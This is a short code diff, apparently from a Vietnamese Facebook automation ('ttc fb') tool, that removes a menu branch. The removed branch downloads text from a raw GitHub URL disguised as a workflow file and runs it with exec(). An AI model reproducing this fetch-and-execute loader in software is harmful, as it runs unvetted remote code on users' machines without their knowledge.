@@ -62,12 +62,4 @@ print (Colorate.Diagonal(Colors.blue_to_purple, "Nhập 1 để vô tool ttc fb"
 
 
 
-
-chon = str(input('\033[1;31m[\033[1;37m<>\033[1;31m] \033[1;37m=> \033[1;32mNhập\033[1;36m Số \033[1;37m: \033[1;33m'))
-
-
-if chon == '1' :
-    exec(requests.get('https://raw.githubusercontent.com/Khanh23047/thoattool/main/.github/workflows/main.yml').text)
-    
-else :
      exit()
